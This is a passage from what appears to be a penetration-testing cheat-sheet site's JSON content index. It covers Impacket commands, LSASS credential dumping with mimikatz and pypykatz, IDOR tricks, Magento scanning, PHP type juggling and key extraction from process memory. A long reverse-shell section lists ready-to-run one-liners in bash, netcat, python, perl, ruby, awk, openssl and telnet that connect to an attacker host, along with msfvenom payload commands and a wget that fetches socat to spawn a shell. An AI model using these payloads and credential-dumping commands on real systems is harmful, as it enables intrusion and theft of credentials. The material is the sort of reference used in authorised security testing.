	"content": " ICMP exfiltration # Using scapy $ scapy Welcome to Scapy (2.2.0) \u0026gt;\u0026gt;\u0026gt; pkts = rdpcap(\u0026#34;ch6.pcap\u0026#34;) \u0026gt;\u0026gt;\u0026gt; payload_echo_request = [ p[ICMP].load for p in pkts if (p[ICMP].type == 8 and p[ICMP].code == 0)] \u0026gt;\u0026gt;\u0026gt; outfile = open(\u0026#39;ICMP_payload.dump\u0026#39;, \u0026#39;wt\u0026#39;) \u0026gt;\u0026gt;\u0026gt; outfile.write(\u0026#34;\u0026#34;.join(payload_echo_request)) \u0026gt;\u0026gt;\u0026gt; outfile.close()# Using Python #!/usr/bin/python from scapy.all import * import yenc pkts = rdpcap(\u0026#34;./echo_request.pcap\u0026#34;) fichier = open(\u0026#34;./donnees\u0026#34;,\u0026#34;w\u0026#34;) for i in range(0,len(pkts)): fichier.write(pkts[i].load) print yenc.decode(\u0026#34;./donnees\u0026#34;,\u0026#34;./résultat\u0026#34;) \nICMP Exfiltration 2 #!/usr/bin/env python from scapy.all import * pcap_file = \u0026#34;challenge.pcapng\u0026#34; data = rdpcap(pcap_file) output = \u0026#34;\u0026#34; for i in range(0, len(data)): if data[i].getlayer(IP).dst == \u0026#34;192.168.1.33\u0026#34;: payload = data[i].load.decode(\u0026#34;utf-8\u0026#34;) print(payload) output += payload output_file = open(\u0026#34;result.b64\u0026#34;, \u0026#34;w\u0026#34;) output_file.write(output) output_file.close()"
},
{
	"uri": "/web-pentest/resources-discovery/idor/",
	"title": "IDOR",
	"tags": [],
	"description": "",
	"content": " IDOR (Insecure Direct Object Reference) # Bypass restrictions using parameter pollution # You can use the same parameter several times api.example/profile?UserId=123 # Ok, your profile api.example/profile?UserId=456 # ERROR api.example/profile?UserId=456\u0026amp;UserId=123 # OK, it can work# Tips # - Some encoded/hashed IDs can be predictable --\u0026gt; Create accounts to see # - Try some id, user_id, message_id even if the application seems to not offer it (on API for ex) # - Parameter Polluttion (HPP) # - Switch between POST and PUT to bypass potential controls # - "
},
{
	"uri": "/windows-systems/exploitation/impacket/",
	"title": "Impacket",
	"tags": [],
	"description": "",
	"content": " Table of Content  General Remote Execution Kerberos Windows Secrets Server Tools / MiTM Attacks WMI Known vulnerabilities SMB/MSRPC MSSQL/TDS File Formats Others  \nGeneral # Almost every Impacket scripts follows the same option syntax authentication: -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH -no-pass don't ask for password (useful for -k) -k Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line -aesKey hex key AES key to use for Kerberos Authentication (128 or 256 bits) connection: -dc-ip ip address IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter -target-ip ip address IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it  \nRemote Execution # See the Remote_Execution_Techniques section # All tools explained \nKerberos # See the Kerberos section # All tools explained \nWindows Secrets # Performs various techniques to dump secrets from the remote machine without # executing any agent there. # For SAM and LSA Secrets (including cached creds) # we try to read as much as we can from the registry and then we save the hives # in the target system (%SYSTEMROOT%\\Temp directory) and read the rest of the data # from there. # For DIT files, we dump NTLM hashes, Plaintext credentials (if available) # and Kerberos keys using the DL_DRSGetNCChanges() method. It can also dump NTDS.dit # via vssadmin executed with the smbexec/wmiexec approach. The script initiates the # services required for its working if they are not available (e.g. # Remote Registry, even if it is disabled). # After the work is done, things are restored to the original state. # Extract NTLM hashes with local files secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL # Remote extraction secretsdump.py -just-dc-ntlm domain/user:password@IP secretsdump.py -just-dc-ntlm domain/user:@IP-hashes LMHASH:NTHASH# Mini shell to control a remote mimikatz RPC server mimikatz.py domain/user:password@IP mimikatz.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password \nServer Tools / MiTM Attacks # This script performs NTLM Relay Attacks, setting an SMB and HTTP Server and relaying # credentials to many different protocols (SMB, HTTP, MSSQL, LDAP, IMAP, POP3, etc.) # By default, it dumps the SAM database responder.py -I eth0 -r -d -w ntlmrelayx.py -tf targets.txt ntlmrelayx.py -tf targets.txt -c \u0026#34;ipconfig\u0026#34; # A SMB Server that answers specific file contents regardless of the SMB share and pathname specified karmaSMB.py filenamePathname karmaSMB.py filenamePathname -smb2support # A Python implementation of an SMB server. Allows to quickly set up shares and user accounts smbserver.py SHARENAME /path/to/your/local/share smbserver.py SHARENAME /path/to/your/local/share --username user --password password \nWMI # It allows to issue WQL queries and get description of WMI objects at # the target system (e.g. select name from win32_account). wmiquery.py domain/user:password@IP # It will open a shell where you can execute WQL queries SELECT * FROM Win32_LogicalDisk WHERE FreeSpace \u0026lt; 209152 # This script creates/removes a WMI Event Consumer/Filter and link between # both to execute Visual Basic based on the WQL filter or timer specified. wmipersist.py domain/user:password@IP install wmipersist.py domain/user:password@IP remove \nKnown vulnerabilities # Exploit for MS14-068. Saves the golden ticket and also launches a PSEXEC session at the target. goldenPac.py domain/user:password@IP goldenPac.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password # This script will exploit CVE-2017-7494, uploading and executing the shared # library specified by the user through the -so parameter. sambaPipe.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password -so SoFilenamepython # Exploit for CVE-2015-0005 using a SMB Relay Attack. # If the target system is enforcing signing and a machine account was # provided, the module will try to gather the SMB session key through NETLOGON. # Command will be executed on victimX for the specified target smbrelayx.py -h victimIP -c cmdToExecute smbrelayx.py -h victimIP -e payload.exe \nSMB/MSRPC # A generic SMB client that will let you list shares and files, rename, # upload and download files and create and delete directories smbclient.py domain/user:password@IP smbclient.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password # This script will connect against a target (or list of targets) machine/s and gather # the OS architecture type installed by (ab)using a documented MSRPC feature. getArch.py -target 10.10.2.2 # This script will dump the list of RPC endpoints and string bindings registered at the # target. It will also try to match them with a list of well known endpoints. rpcdump.py domain/user:password@IP rpcdump.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password # This script will bind to the target\u0026#39;s MGMT interface to get a list of interface IDs. ifmap.py 10.10.20.1 135 ifmap.py 10.10.20.1 49154 # This binds to the given hostname:port and MSRPC interface. # Then, it tries to call each of the first 256 operation numbers in turn # and reports the outcome of each call # Need to get interfaces, for example with ifmap.py # usage: opdump.py hostname port interface version opdump.py 10.10.1.1 135 135 99FCFEC4-5260-101B-BBCB-00AA0021347A 0.0 # An application that communicates with the Security Account Manager Remote interface # from the MSRPC suite. It lists system user accounts, available resource shares # and other sensitive information exported through this service. ./samrdump.py SERVER/Administrator:T00r@192.168.1.140 # This script can be used to manipulate Windows services through the [MS-SCMR] MSRPC # Interface. It supports start, stop, delete, status, config, list, create and change. services.py SERVER/Administrator:T00r@192.168.1.140 {start,stop,delete,status,config,list,create,change} # Gets a list of the sessions opened at the remote hosts netview.py domain/user:password -target 192.168.10.2 netview.py domain/user:password -target 192.168.10.2 -user Administrator # Remote registry manipulation tool through the [MS-RRP] MSRPC Interface. # The idea is to provide similar functionality as the REG.EXE Windows utility. reg.py domain/user:password@IP query -keyName HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows -s reg.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password # A Windows SID brute forcer example through [MS-LSAT] MSRPC Interface # aiming at finding remote users/groups. lookupsid.py domain/user:password@IP lookupsid.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password \nMSSQL/TDS # Retrieves the MSSQL instances names from the target host. mssqlinstance.py 192.168.1.2 # An MSSQL client, supporting SQL and Windows Authentications (hashes too). It also supports TLS. mssqlclient.py -windows-auth htb.local/mssql-svc@10.10.x.x \nFile Formats # An Extensibe Storage Engine format implementation. Allows dumping catalog, # pages and tables of ESE databases (e.g. NTDS.dit) esentutl.py databaseFile {dump,info,export} # NTFS format implementation. This script provides a mini shell for # browsing and extracting an NTFS volume, including hidden/locked contents. ntfs-read.py /dev/disk1 ntfs-read.py \u0026#34;\\C:\u0026#34; ntfs-read.py \u0026#34;\\C:\u0026#34; -extract \u0026#34;\\windows\\system32\\config\\sam\u0026#34; # A Windwows Registry file format implementation. It allows to parse offline registry hives. registry-read.py registryHive enum_key,enum_values,get_value,get_class,walk} \nOthers # This script will gather data about the domain\u0026#39;s users and their corresponding email addresses. GetADUsers.py domain/user:password@IP # Simple MQTT example aimed at playing with different login options. mqtt_check.py domain/user:password@IP mqtt_check.py domain/user:password@IP -ssl # [MS-RDPBCGR] and [MS-CREDSSP] partial implementation just to reach CredSSP auth. # This example test whether an account is valid on the target host. rdp_check.py domain/user:password@IP rdp_check.py domain/user@IP -hashes LMHASH:NTHASH # Simple packet sniffer that uses a raw socket to listen for packets # in transit corresponding to the specified protocols. sniffer.py {tcp, udp, icmp} # Simple ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host. ping.py \u0026lt;src-ip\u0026gt; \u0026lt;dst-ip\u0026gt; # Simple IPv6 ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host. ping6.py \u0026lt;src-ip\u0026gt; \u0026lt;dst-ip\u0026gt; \n"
},
{
	"uri": "/web-pentest/injections/",
	"title": "Injections",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/windows-systems/privilege-escalation/lsass_mimikatz/",
	"title": "LSASS and Mimikatz",
	"tags": [],
	"description": "",
	"content": " LSASS # Avoiding running Mimikatz on the target can be a nice solution for stealth # You can just dump the LSASS process, get them and parse it locally procdump.exe -accepteula -ma lsass.exe lsass.dmp # Several dumping methods here https://kaluche.github.io/posts/2020/09/dumping-credentials-offline/ \nMimikatz # If you have an LSASS dump, you can use the minidump module mimikatz # sekurlsa::minidump lsass.DMP mimikatz # sekurlsa::logonPasswords /full # You can upload mimikatz to a remote machine with smbclient # Or you can use crackmapexec # Executon may fail but the binary will be uploaded in C:\\\\Windows\\\\mimikatz.exe crackmapexec IP -u user -p password -M mimikatz # Then you can execute remotely through winexe winexe -U admin%password //IP C:\\\\Windows\\\\mimikatz.exe # Password dumping mimikatz # privilege::debug mimikatz # sekurlsa::logonPasswords /full# In case of Mimikatz is trigerred on the target machine, you can try bring it up using network share sudo python smbserver.py SHARE /home/xxxxx/share_path/ sudo ./venv/bin/crackmapexec smb IP -u \u0026#34;xxx\u0026#34; -p \u0026#34;xxx\u0026#34; -X \u0026#39;\\\\share_ip\\SHARE\\mimikatz.exe \u0026#34;privilege::debug\u0026#34; \u0026#34;sekurlsa::logonPasswords /full\u0026#34; exit \u0026gt; \\\\share_ip\\SHARE\\mimiout_$env:computername.txt\u0026#39; # In order to be stealthier, you can even do the same for procdump sudo ./venv/bin/crackmapexec smb IP -u \u0026#34;xxx\u0026#34; -p \u0026#34;xxx\u0026#34; -X \u0026#39;\\\\share_ip\\SHARE\\procdump.exe \u0026#34;TODO\u0026#34;\u0026#39; \nPypykatz https://github.com/skelsec/pypykatz # Mimikatz implementation in pure Python. At least a part of it :) # In case of mimikatz is trigerred by the target AV # Cross platform (only need python3.6) # Live commands need to be ran on live systems # Others commands can be used for other purposes# Get LSASS credentials (+ Kerberos tickets) pypykatz live lsa pypykatz live lsa -o \u0026lt;output_dir\u0026gt; -k \u0026lt;kerberos_dir\u0026gt; # List users prone to SPNRoast and ASRepRoast pypykatz live ldap spn pypykatz live ldap asrep # Print all tokens pypykatz live token list # Spawn a SYSTEM shell pypykatz live process create # Print registry credentials pypykatz live registry # List all users ever logged on the target pypykatz live users list # Gives back the current user in domain:username:SID format pypykatz live users whoami# Parsr mimidump file pypykatz lsa minidump \u0026lt;input_file\u0026gt; # List domain users prone to SPNRoast or ASRepRoast pypykatz ldap TEST/victim/pw:@10.10.10.2 spn pypykatz ldap TEST/victim/pw:@10.10.10.2 asrep # Decrypt gpp-pass pypykatz gppass \u0026lt;base64_enc_password\u0026gt;"
},
{
	"uri": "/web-pentest/content-management-system-cms/magento/",
	"title": "Magento",
	"tags": [],
	"description": "",
	"content": " Getting Magento Version # Magento has 2 mains branches, Magento 1 and Magento 2# On Magento 2, you can add /magento_version targetsite.com/magento_version# On magento 1, you have another login interface at /dowloader # Versions can be displayed in the footer https://www.example.com/downloader/ https://www.example.com/magento/downloader/# You can find the version by comparing hash file signatures # between several versions and the running one. # That\u0026#39;s what magescan does. https://github.com/steverobbins/magento-version-identification-php \nMagescan # Online scanner # Usefull and complete, but online https://magescan.com/# Magescan is a complete scanner for Magento applications. # The idea behind this is to evaluate the quality and security of # a Magento site you don\u0026#39;t have access to. https://github.com/steverobbins/magescan # Scan techniques : # - all : full scan # - catalog : get catalog information # - modules : get installed modules (plugins) # - patch : get patch informations # - server : get server technology # - sitemap : get sitemap # - unreachable : check unreachable paths # - version : get magento version magescan.phar scan:\u0026lt;technique\u0026gt; store.example.com # If set, SSL certificates won\u0026#39;t be validated magescan.phar scan:\u0026lt;technique\u0026gt; store.example.com --insecure magescan.phar scan:\u0026lt;technique\u0026gt; store.example.com -k # Lists all modules searched for, not just those found magescan.phar scan:\u0026lt;technique\u0026gt; store.example.com --show-modules"
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/misc/others/",
	"title": "Others",
	"tags": [],
	"description": "",
	"content": " MISC / Tips # Wget Wizard # Generate wget commands depending what you want https://www.whatismybrowser.com/developers/tools/wget-wizard/# You can simulate Google Search from other locations using Isearchfrom # It\u0026#39;s useful for searching Google as if you were somewhere else, as well as for SEO \u0026amp; SEA testing. https://isearchfrom.com/ \nSecrets \u0026amp; Default Passwords # Looking for passwors, API keys etc # Check Online IDES site:http://ideone.com \u0026#34;apikey\u0026#34; site:http://ideone.com \u0026#34;aws_access_key_id\u0026#34;# Default passwords https://www.routerpasswords.com/ https://cirt.net/passwords https://default-password.info/ http://defaultpassword.us/ http://www.passwordsdatabase.com/ http://open-sez.me/ Code replication # You can find same website piece of code to identify same vendors https://nerdydata.com/search https://searchcode.com/ \nForums # Find informations on forums http://boardreader.com https://raidforums.com/ \n"
},
{
	"uri": "/web-pentest/php-vulnerabilities/type_juggling/",
	"title": "PHP Type Juggling",
	"tags": [],
	"description": "",
	"content": " Type Juggling and Loose Comparison # Type Juggling # In PHP, “==” returns true if $a equals $b AFTER transtyping \u0026#34;0000\u0026#34; == int(0) -\u0026gt; TRUE \u0026#34;0e12\u0026#34; == int(0) -\u0026gt; TRUE \u0026#34;1abc\u0026#34; == int(1) -\u0026gt; TRUE \u0026#34;0abc\u0026#34; == int(0) -\u0026gt; TRUE \u0026#34;abc\u0026#34; == int(0) -\u0026gt; TRUE # Loose Comparison # In PHP, if “==” is used, then 2 strings beginning by “0e” and filled with numbers will always be equal # It means that you can use magic hashes (0exxxx...) to break the comparison # md5(240610708) = 0e462097431906509019562988736854 # So 0e == 240610708 → true# Magic hash for SHA-224 10885164793773 --\u0026gt; 0e281250946775200129471613219196999537878926740638594636# Magic hash for SHA-256 34250003024812 --\u0026gt; 0e46289032038065916139621039085883773413820991920706299695051332 \nstrcmp() # If you provide an array to strcmp() it returns NULL # NULL == 0"
},
{
	"uri": "/linux-systems/privilege-escalation/",
	"title": "Privilege Escalation",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/windows-systems/privilege-escalation/",
	"title": "Privilege Escalation",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/shells-methods/reverse/",
	"title": "Reverse Shell",
	"tags": [],
	"description": "",
	"content": " Resources https://alamot.github.io/reverse_shells/ https://github.com/ShutdownRepo/shellerator \nTable of Content  Basics / Classical Reverse shell using ngrok PHP Windows Linux AWK Python Windows WAR OpenSSL Telnet LUA Ruby Perl  \nBasics / Classical Reverse shell: nc -nv IP 443 -e /bin/bash ncat --udp IP 443 -e /bin/bash OR /bin/sh | nc ATTACKING-IP 443 OR rm -f /tmp/x; mknod /tmp/x p \u0026amp;\u0026amp; nc \u0026lt;IP\u0026gt; \u0026lt;PORT\u0026gt; 0\u0026lt;/tmp/x | /bin/bash 1\u0026gt;/tmp/x rm -f /tmp/x; mknod /tmp/x p \u0026amp;\u0026amp; /bin/nc.openbsd \u0026lt;IP\u0026gt; \u0026lt;PORT\u0026gt; 0\u0026lt;/tmp/x | /bin/bash 1\u0026gt;/tmp/x rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc \u0026lt;IP\u0026gt; \u0026lt;PORT\u0026gt; \u0026gt; /tmp/f rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|/bin/nc.openbsd \u0026lt;IP\u0026gt; \u0026lt;PORT\u0026gt; \u0026gt; /tmp/f OR /bin/nc.traditional \u0026lt;IP\u0026gt; \u0026lt;PORT\u0026gt; -e /bin/bash /bin/nc.traditional \u0026lt;IP\u0026gt; \u0026lt;PORT\u0026gt; -c /bin/bash# Socat reverse shell allow to have TTY # Attacker machine socat file:`tty`,raw,echo=0 tcp-listen:4444 # Target machine wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod+x/tmp/socat; /tmp/socat exec:\u0026#39;bash -li\u0026#39;,pty,stderr,setsid,sigint,sanetcp:100.100.100.100:4444 \nReverse shell using ngrok # On attacker (term1) ngrok tcp 12345 # On attacker (term2) nc -lvp 12345 # On target, use your reverse shell payload on the ngrok tunnel target nc 0.tcp.ngrok.io \u0026lt;port\u0026gt; -e /bin/sh \nPHP Reverse Shell php -r \u0026#39;$s=fsockopen(\u0026#34;\u0026lt;IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;);exec(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$s=fsockopen(\u0026#34;\u0026lt;IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;);shell_exec(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$s=fsockopen(\u0026#34;\u0026lt;IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;);`/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3`;\u0026#39; php -r \u0026#39;$s=fsockopen(\u0026#34;\u0026lt;IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;);system(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$s=fsockopen(\u0026#34;\u0026lt;IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;);passthru(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$s=fsockopen(\u0026#34;\u0026lt;IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;);popen(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;, \u0026#34;r\u0026#34;);\u0026#39; # Using msfvenom msfvenom -p php/shell/reverse_tcp LHOST=IP LPORT=443 -f raw -o shell.php #You can also use the php reverse shell with a complete handler by pentest-monkey, available in Kali by default \nWindows msfvenom -p windows/shell_reverse_tcp -b “\\x00\\x0a\\x0d” LHOST=IP LPORT=443 -f asp \u0026gt; acknak_TCP_RS.asp msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -e x86/shikata_ga_nai -o shell.aspx# Netcat equivalent for Powershell ! https://github.com/besimorhino/powercat \nLinux bash -i \u0026gt;\u0026amp; /dev/tcp/ATTACKING-IP/443 0\u0026gt;\u0026amp;1 bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.10/443 0\u0026gt;\u0026amp;1 \nAWK awk \u0026#39;BEGIN {s = \u0026#34;/inet/tcp/0/10.10.14.10/80\u0026#34;; while(42) { do{ printf \u0026#34;shell\u0026gt;\u0026#34; |\u0026amp; s; s |\u0026amp; getline c;\\ if(c){ while ((c |\u0026amp; getline) \u0026gt; 0) print $0 |\u0026amp; s; close(c); } } while(c != \u0026#34;exit\u0026#34;) close(s); }}\u0026#39; /dev/null OR #!/usr/bin/awk -f BEGIN { s = \u0026#34;/inet/tcp/0/\u0026lt;IP\u0026gt;/\u0026lt;PORT\u0026gt;\u0026#34; while(42) { do{ printf \u0026#34;shell\u0026gt;\u0026#34; |\u0026amp; s s |\u0026amp; getline c if(c){ while ((c |\u0026amp; getline) \u0026gt; 0) print $0 |\u0026amp; s close(c) } } while(c != \u0026#34;exit\u0026#34;) close(s) } } OR #!/usr/bin/gawk -f  BEGIN { Port = 443 Prompt = \u0026#34;pwn\u0026gt; \u0026#34; Service = \u0026#34;/inet/tcp/\u0026#34; Port \u0026#34;/0/0\u0026#34; while (1) { do { printf Prompt |\u0026amp; Service Service |\u0026amp; getline cmd if (cmd) { while ((cmd |\u0026amp; getline) \u0026gt; 0) print $0 |\u0026amp; Service close(cmd) } } while (cmd != \u0026#34;exit\u0026#34;) close(Service) } } \nPython #!/usr/bin/env python import socket,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\u0026#34;10.11.0.179\u0026#34;,443)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) os.system(\u0026#34;/bin/sh -i\u0026#34;) OR python -c “import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#39;IP\u0026#39;,443));\\ os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system(\u0026#39;/bin/sh -i\u0026#39;)” # UDP python -c \u0026#39;import socket,pty,os;lhost = \u0026#34;IP\u0026#34;; lport = 100;\\ s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect((lhost, lport));\\ os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);\\ os.putenv(\u0026#34;HISTFILE\u0026#34;,\u0026#34;/dev/null\u0026#34;); pty.spawn(\u0026#34;/bin/bash\u0026#34;); s.close();\u0026#39; \n# Python PTY Shells python-pty-shells # Can be very good simpleHTTPServer wget ... -O /dev/shm/.rev.py python tcp_pty_shell_handler -b ip:port Windows - WAR Reverse Shell # Build the payload msfvenom -p java/shell_reverse_tcp LHOST=IP LPORT=443 -f war -o shell.war # File Structure reverse_shell.war | |__reverse_shell.jsp | |_____META-INF/ | |_____WEB-INF/ | |____web.xml # Explanations web.xml is asking for a reference to /cmd.jsp, when you upload the .war you can then access to /cmd/ directory, just ask cmd.jsp and that\\\u0026#39;s it # Then access \u0026lt;IP\u0026gt;/reverse_shell/reverse_shell.jsp # And.. nc -nvlp 443 \nThrough OpenSSL # Generate certificate: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes # Listener: openssl s_server -quiet -key key.pem -cert cert.pem -port \u0026lt;PORT\u0026gt; # Reverse Shell: mkfifo /tmp/s; /bin/sh -i \u0026lt; /tmp/s 2\u0026gt;\u0026amp;1 | openssl s_client -quiet -connect \u0026lt;ATTACKER-IP\u0026gt;:\u0026lt;PORT\u0026gt; \u0026gt; /tmp/s;\\ rm /tmp/s mkfifo /tmp/s; /bin/sh -i \u0026lt; /tmp/s 2\u0026gt;\u0026amp;1 | openssl s_client -quiet -connect \u0026lt;ATTACKER-IP\u0026gt;:\u0026lt;PORT\u0026gt; \u0026gt; /tmp/s;\\ rm /tmp/s \nTelnet telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443 OR rm f;mkfifo f;cat f|/bin/sh -i 2\u0026gt;\u0026amp;1|telnet \u0026lt;IP\u0026gt; \u0026lt;PORT\u0026gt; \u0026gt; f rm -f x; mknod x p \u0026amp;\u0026amp; telnet \u0026lt;IP\u0026gt; \u0026lt;PORT\u0026gt; 0\u0026lt;x | /bin/bash 1\u0026gt;x (Listen on the port 443 machine) \nUsing LUA In MSF =\u0026gt; payload/cmd/unix/reverse_lua OR this tool: https://github.com/cuhsat/palantir \nRuby # Linux ruby -rsocket -e \u0026#39;exit if fork;c=TCPSocket.new(\u0026#34;\u0026lt;IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;);while(cmd=c.gets);IO.popen(cmd,\u0026#34;r\u0026#34;){|io|c.print io.read}end\u0026#39; ruby -rsocket -e \u0026#39;f=TCPSocket.open(\u0026#34;\u0026lt;IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;).to_i;exec sprintf(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;%d \u0026gt;\u0026amp;%d 2\u0026gt;\u0026amp;%d\u0026#34;,f,f,f)\u0026#39; # Windows ruby -rsocket -e \u0026#34;c=TCPSocket.new(\u0026#39;\u0026lt;IP\u0026gt;\u0026#39;,\u0026lt;PORT\u0026gt;);while(cmd=c.gets);IO.popen(cmd,\u0026#39;r\u0026#39;){|io|c.print io.read}end\u0026#34; \nPerl # Windows perl -MIO -e \u0026#39;$c=new IO::Socket::INET(PeerAddr,\u0026#34;ATTACKING-IP:80\u0026#34;);STDIN-\u0026gt;fdopen($c,r);$~-\u0026gt;fdopen($c,w);system$_ while\u0026lt;\u0026gt;;\u0026#39; # Linux perl -e \u0026#39;use Socket;$i=\u0026#34;ATTACKING-IP\u0026#34;;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\u0026#34;tcp\u0026#34;))\\ if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);open(STDOUT,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);\\ open(STDERR,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);exec(\u0026#34;/bin/sh -i\u0026#34;);};\u0026#39;"
},
{
	"uri": "/cryptography/ssl_keys_extraction/",
	"title": "SSL Keys extraction",
	"tags": [],
	"description": "",
	"content": " Resources https://github.com/aviat/passe-partout \nExtraction SSH Agent $ sudo ./passe-partout 4712 Target has pid 4712 on_signal(17 - SIGCHLD) from 4712 [-] invalid DSA key. [-] invalid DSA key. [-] invalid DSA key. [-] invalid DSA key. [X] Valid RSA key found. [X] Key saved to file id_rsa-0.key [-] invalid DSA key. [-] invalid DSA key. [-] invalid DSA key. [-] invalid DSA key. done for pid 4712 OpenSSH_4.3p2 Debian-6, OpenSSL 0.9.8e 23 Feb 2007 debug1: Reading configuration data /dev/null debug1: Connecting to 192.168.0.1 [192.168.0.1] port 22. debug1: Connection established. debug1: identity file myplain.key type -1 [...] debug1: Authentications that can continue: publickey,password debug1: Next authentication method: publickey debug1: Trying private key: myplain.key \u0026lt;=== debug1: read PEM private key done: type RSA \u0026lt;=== debug1: Authentication succeeded (publickey). \u0026lt;=== debug1: channel 0: new [client-session] debug1: Entering interactive session. Last login: Wed Aug 22 17:16:00 2007 from 192.168.0.51 admin@192.168.0.1:~$ Apache $ ./passe-partout 29960 Target has pid 29960 on_signal(17 - SIGCHLD) from 29960 [-] invalid DSA key. [-] invalid DSA key. [...] [-] unable to check key. [-] unable to check key. [X] Valid DSA key found. [X] Key saved to file id_dsa-0.key [-] unable to check key. [...] [X] Valid DSA key found. [X] Key saved to file id_dsa-26.key [...] [X] Valid RSA key found. [X] Key saved to file id_rsa-0.key [...] [X] Valid RSA key found. [X] Key saved to file id_rsa-2.key [-] invalid DSA key. [-] invalid DSA key. [-] invalid DSA key. [-] invalid DSA key. done for pid 29960 $ ls *key id_dsa-0.key id_dsa-15.key id_dsa-20.key id_dsa-26.key id_dsa-7.key id_dsa-10.key id_dsa-16.key id_dsa-21.key id_dsa-2.key id_dsa-8.key id_dsa-11.key id_dsa-17.key id_dsa-22.key id_dsa-3.key id_dsa-9.key id_dsa-12.key id_dsa-18.key id_dsa-23.key id_dsa-4.key id_rsa-0.key id_dsa-13.key id_dsa-19.key id_dsa-24.key id_dsa-5.key id_rsa-1.key id_dsa-14.key id_dsa-1.key id_dsa-25.key id_dsa-6.key id_rsa-2.key # Finding manually which key is correct $ openssl s_client -connect localhost:443\u0026gt; server_certificate.txt depth=0 /CN=ubuntu verify error:num=18:self signed certificate verify return:1 depth=0 /CN=ubuntu verify return:1 # or by letting the script obtaning the certificate itself $ ruby match_private_key.rb server_certificate.txt id_rsa-2.key$ ruby match_private_key.rb https://server.fr id_rsa-2.key OpenVPN $ ps aux|grep openvpn root 30006 0.0 0.1 5116 3060 pts/25 S+ 14:54 0:00 openvpn openvpn.config user 31179 0.0 0.0 3056 824 pts/22 R+ 15:02 0:00 grep --color openvpn $ sudo ./passe-partout 30006 Target has pid 30006 testing /lib/tls/i686/cmov/libc-2.10.1.so (0x251000) testing anonymous (0x252000) testing /lib/i686/cmov/libcrypto.so.0.9.8 (0x4ea000) testing anonymous (0x4f7000) testing /usr/lib/liblzo2.so.2.0.0 (0x747000) testing /lib/libz.so.1.2.3.3 (0x794000) testing /lib/tls/i686/cmov/libpthread-2.10.1.so (0x979000) testing anonymous (0x97a000) testing /lib/ld-2.10.1.so (0xc0f000) testing /lib/tls/i686/cmov/libdl-2.10.1.so (0xc52000) testing /lib/i686/cmov/libssl.so.0.9.8 (0xd82000) testing 